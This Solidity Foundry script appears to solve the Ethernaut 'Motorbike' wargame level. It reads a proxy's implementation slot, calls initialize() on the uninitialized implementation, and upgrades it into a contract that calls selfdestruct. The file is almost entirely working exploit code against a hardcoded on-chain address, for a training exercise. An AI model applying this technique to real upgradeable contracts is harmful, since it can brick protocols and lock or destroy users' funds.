// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "../src/Motorbike.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DestructedContract {
    function destroy() public {
        selfdestruct(address(0));
    }
}

contract MotorbikeSolution is Script {
    Motorbike motorbike = Motorbike(0x3af6a2fA1dBaa34f5f4Bb3886fF84b615A116960);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address implementation = address(
            uint160(
                uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))
            )
        );
        Engine engine = Engine(implementation);

        engine.initialize();
        DestructedContract dc = new DestructedContract();
        engine.upgradeToAndCall(0x02128E758cA4580654f3F53c3C64A20Ffd62d0Eb, abi.encodeWithSignature("destroy()"));
        implementation = address(
            uint160(
                uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))
            )
        );
        console.log(implementation);
        vm.stopBroadcast();
    }
}
